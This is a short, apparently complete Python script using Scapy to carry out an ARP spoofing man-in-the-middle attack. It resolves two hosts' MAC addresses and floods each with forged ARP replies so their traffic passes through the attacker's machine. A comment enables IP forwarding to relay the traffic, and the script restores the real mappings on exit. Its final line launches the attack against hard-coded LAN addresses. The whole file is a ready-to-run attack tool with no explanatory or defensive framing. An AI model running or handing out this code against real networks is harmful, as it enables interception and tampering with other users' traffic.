from idna import intranges
from scapy.all import *
import time
import sys

# sysctl -w net.ipv4.ip_forward=1


def get_mac(target_ip, interface):
    ans, unans = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip),
        iface=interface,
        timeout=2,
        verbose=0,
    )
    return ans[0][1][ARP].hwsrc


class ARPpoison:
    def __init__(self, target1_ip, target2_ip, interface):
        self.target1_ip = target1_ip
        self.target1_mac = get_mac(target1_ip, interface)

        self.target2_ip = target2_ip
        self.target2_mac = get_mac(target2_ip, interface)

        self.interface = interface

    def poison(self):
        send(
            ARP(
                op=2, pdst=self.target1_ip, hwdst=self.target1_mac, psrc=self.target2_ip
            ),
            iface=self.interface,
            verbose=0,
        )
        send(
            ARP(
                op=2, pdst=self.target2_ip, hwdst=self.target2_mac, psrc=self.target1_ip
            ),
            iface=self.interface,
            verbose=0,
        )

    def restore(self):
        send(
            ARP(
                op=2,
                pdst=self.target1_ip,
                hwdst=self.target1_mac,
                psrc=self.target2_ip,
                hwsrc=self.target2_mac,
            ),
            iface=self.interface,
            verbose=0,
        )
        send(
            ARP(
                op=2,
                pdst=self.target2_ip,
                hwdst=self.target2_mac,
                psrc=self.target1_ip,
                hwsrc=self.target1_mac,
            ),
            iface=self.interface,
            verbose=0,
        )

    def run(self):
        try:
            while True:
                self.poison()
                time.sleep(1)
                print("*", end="")
                sys.stdout.flush()
        except KeyboardInterrupt:
            print("Restauring mac....")
            self.restore()


interface = "enx98fc84e326dd"
ARPpoison("192.168.1.10", "192.168.1.12", interface).run()
